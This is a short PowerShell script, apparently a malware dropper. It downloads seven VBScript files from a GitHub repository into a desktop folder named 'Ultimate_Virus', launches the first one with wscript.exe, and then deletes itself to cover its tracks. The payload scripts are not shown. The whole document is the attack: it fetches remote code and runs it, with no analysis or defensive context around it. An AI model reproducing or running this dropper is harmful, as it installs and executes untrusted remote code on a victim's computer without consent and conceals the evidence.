Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SirStilton/Dq-3068hackDq-3068/refs/heads/main/Phase1.vbs' -OutFile "$env:USERPROFILE\Desktop\Ultimate_Virus\Phase1.vbs"
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SirStilton/Dq-3068hackDq-3068/refs/heads/main/Phase2.vbs' -OutFile "$env:USERPROFILE\Desktop\Ultimate_Virus\Phase2.vbs"
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SirStilton/Dq-3068hackDq-3068/refs/heads/main/Phase3.vbs' -OutFile "$env:USERPROFILE\Desktop\Ultimate_Virus\Phase3.vbs"
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SirStilton/Dq-3068hackDq-3068/refs/heads/main/Phase4.vbs' -OutFile "$env:USERPROFILE\Desktop\Ultimate_Virus\Phase4.vbs"
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SirStilton/Dq-3068hackDq-3068/refs/heads/main/Phase5.vbs' -OutFile "$env:USERPROFILE\Desktop\Ultimate_Virus\Phase5.vbs"
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SirStilton/Dq-3068hackDq-3068/refs/heads/main/voice.vbs' -OutFile "$env:USERPROFILE\Desktop\Ultimate_Virus\voice.vbs"
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SirStilton/Dq-3068hackDq-3068/refs/heads/main/disco.vbs' -OutFile "$env:USERPROFILE\Desktop\Ultimate_Virus\disco.vbs"
wscript.exe "$env:USERPROFILE\Desktop\Ultimate_Virus\Phase1.vbs"
Remove-Item $MyInvocation.MyCommand.Path -Force